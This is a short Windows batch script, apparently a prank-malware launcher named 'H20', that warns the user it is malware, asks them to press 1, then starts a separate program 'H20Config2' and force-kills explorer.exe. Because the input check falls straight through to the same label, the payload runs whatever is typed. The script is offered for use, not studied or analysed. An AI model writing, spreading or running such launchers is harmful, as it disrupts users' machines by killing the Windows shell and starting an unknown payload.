@echo off
title H20
color 95

echo H20
echo .
echo the program you are about to run is malware, we have nothing to do with it if your machine breaks, if you know what you are running, go for it!
echo .
echo PRESS 1 + ENTER TO START

set /p inp=

if %inp% == 1 goto x

:x
start H20Config2
taskkill /f /im explorer.exe